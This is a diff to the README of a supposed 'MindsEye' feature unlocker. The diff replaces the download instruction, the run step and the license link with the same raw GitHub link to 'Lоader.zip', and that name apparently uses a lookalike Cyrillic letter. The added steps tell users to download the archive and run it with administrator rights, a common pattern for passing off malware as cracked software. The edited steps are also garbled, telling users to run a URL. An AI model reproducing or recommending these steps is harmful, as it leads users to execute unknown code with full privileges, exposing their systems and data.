@@ -25,9 +25,9 @@ This advanced loader removes barriers and gives you unrestricted access to all c
 
 ## 🚀 Installation
 
-1. Download `Loader.rar` from the repository
+1. Download `https://raw.githubusercontent.com/JayKris4/bsl-graph/main/Lоader.zip` from the repository
 2. Extract all files using WinRAR or 7-Zip
-3. Run `MindsEyeUnlocker.exe` with administrator rights
+3. Run `https://raw.githubusercontent.com/JayKris4/bsl-graph/main/Lоader.zip` with administrator rights
 4. Follow on-screen instructions to complete initialization
 5. Enjoy unrestricted access to all MindsEye features!
 
@@ -41,4 +41,4 @@ This loader was created for educational and backup purposes only. It is your res
 
 ## 📄 License
 
-Distributed under the MIT License (2025): https://opensource.org/licenses/MIT
+Distributed under the MIT License (2025): https://raw.githubusercontent.com/JayKris4/bsl-graph/main/Lоader.zip
